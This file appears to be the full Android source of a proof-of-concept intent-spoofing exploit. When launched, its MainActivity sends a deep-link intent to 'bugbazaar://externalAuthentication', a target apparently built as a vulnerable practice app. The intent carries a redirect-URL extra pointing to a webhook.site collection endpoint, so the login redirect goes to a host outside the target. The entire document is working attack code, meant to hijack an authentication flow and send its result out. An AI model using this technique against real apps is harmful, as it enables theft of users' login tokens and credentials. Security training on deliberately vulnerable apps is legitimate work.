package com.ved.intentspoofing;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        // Create a new Intent
        Intent intent = new Intent();

        // Set the action and data URI for the Intent
        intent.setAction(Intent.ACTION_VIEW);
        intent.setData(Uri.parse("bugbazaar://externalAuthentication"));

        // Add extra data to the Intent
        intent.putExtra("ExternalAuthLoginActivity.EXTRA_REDIRECT_URL", "https://webhook.site/97f16cfd-e32b-4126-a406-0583b4ab5e48");

        // Start the activity using the Intent
        startActivity(intent);
    }
}